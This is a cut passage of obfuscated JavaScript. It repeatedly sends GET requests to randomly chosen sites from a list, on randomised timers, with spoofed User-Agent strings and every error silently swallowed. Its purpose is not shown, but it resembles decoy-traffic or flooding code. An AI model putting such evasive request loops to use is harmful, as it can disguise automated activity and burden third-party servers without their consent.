  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x1 * 0xb43 + 0x1 * 0x1d42 + 0x959 * 0x1) * getRandomInt(0x561 * -0x1 + 0x2 * 0x22 + 0x51e, -0x65 * 0x53 + -0x1b47 * -0x1 + 0x57d));
}, 0x22 * 0x9 + -0x4 * 0x146 + 0x44a);